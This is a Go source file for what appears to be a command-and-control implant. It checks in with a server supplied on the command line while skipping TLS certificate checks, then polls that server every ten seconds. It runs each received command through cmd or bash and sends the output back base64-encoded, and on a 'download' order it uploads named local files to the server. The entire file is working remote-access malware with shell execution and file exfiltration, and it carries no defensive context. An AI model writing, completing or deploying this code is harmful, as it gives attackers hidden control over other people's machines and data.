package main

import (
   "net/http"
   "crypto/tls"
   b64 "encoding/base64"
   "fmt"
   "os"
   "time"
   "io/ioutil"
   "io"
   "strings"
   "os/exec"
   "mime/multipart"
   "bytes"
)



func main() {
id := os.Args[1]
data := "Hello From Agent "+ id +" (Go)"
sEnc := b64.StdEncoding.EncodeToString([]byte(data))


http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
_, err := http.Get(os.Args[2]+"/res.php?id="+id+"&res=" + sEnc )
if err != nil {
	fmt.Println(err)
}


for{

hey()

}


}

func createForm(form map[string]string) (string, io.Reader, error) {
   body := new(bytes.Buffer)
   mp := multipart.NewWriter(body)
   defer mp.Close()
   for key, val := range form {
      if strings.HasPrefix(val, "@") {
         val = val[1:]
         file, err := os.Open(val)
         if err != nil { return "", nil, err }
         defer file.Close()
         part, err := mp.CreateFormFile(key, val)
         if err != nil { return "", nil, err }
         io.Copy(part, file)
      } else {
         mp.WriteField(key, val)
      }
   }
   return mp.FormDataContentType(), body, nil
}

func hey(){

id := os.Args[1]
http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
res, err := http.Get(os.Args[2]+"/cmds.php?id="+id+"&o=G")
if err != nil {
	fmt.Println(err)
	}
resBody, err := ioutil.ReadAll(res.Body)


cmds := string(resBody)

for _, line := range strings.Split(strings.TrimRight(cmds, "\n"), "\n") {
      if strings.Contains(string(line), string(id)){
      act:= strings.Split(line, ":")[1]
     
      if act == "run"{
      fmt.Println(line)
      var syscmd string
      var sysparam string
      syscmd = "cmd"
      sysparam = "/c"
      cmdline := strings.Join(strings.Split(line, ":")[2:], ":")
      if string(os.PathSeparator) == "/" {
      syscmd = "/bin/bash"
      sysparam = "-c"
      }
      Output, err := exec.Command(syscmd, sysparam, cmdline).Output()
      if err != nil {
        fmt.Println(err)
      }
     
      b64Output := b64.StdEncoding.EncodeToString([]byte(string(Output)))
      http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
      gimme, err := http.Get(os.Args[2]+"/res.php?res="+b64Output+"&id="+id)
      if err != nil {
	fmt.Println(err)
	}
      fmt.Println(gimme)	
      }
      
      
      
      
      
      if act == "download"{
      file := strings.Join(strings.Split(line, ":")[2:], ":")
      form := map[string]string{"data": "@"+file}
   ct, body, err := createForm(form)
   if err != nil {
      panic(err)
   }
      fmt.Println(line)
      
     
      http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
      
      filemsg :="Uploading " + string(file)
      filemsgEnc := b64.StdEncoding.EncodeToString([]byte(filemsg))
      
      msgup, err := http.Get(os.Args[2]+"/res.php?res="+filemsgEnc+"&id="+id)
      if err != nil {
	fmt.Println(err)
	}
      fmt.Println(msgup)
      gimme, err := http.Post(os.Args[2]+"/up.php?id="+id, ct, body)
      if err != nil {
	fmt.Println(err)
	}
      fmt.Println(gimme)	
      }
}
      }

time.Sleep(10 * time.Second)


}
